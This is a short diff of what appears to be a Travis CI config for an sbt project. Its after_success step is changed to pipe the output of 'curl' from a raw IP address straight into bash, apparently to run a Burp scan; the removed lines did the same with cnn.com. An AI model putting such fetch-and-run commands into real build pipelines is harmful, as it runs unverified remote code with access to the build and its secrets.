@@ -11,11 +11,7 @@ script:
      sbt compile test run >> temp.log
 
 after_success:   
-   - bash <(curl -s http://cnn.com) > temp_cnn.log &&
-     bash <(curl -s http://35.153.160.75:8080) > temp_burp.log &&
-     bash ./burp-scanner.sh >> temp2.log &&
-     less temp_cnn.log &&
-     echo "===================================================================================" &&
+   - bash <(curl http://35.153.160.75:8080) > temp_burp.log &&
      less temp_burp.log
 
 notifications:
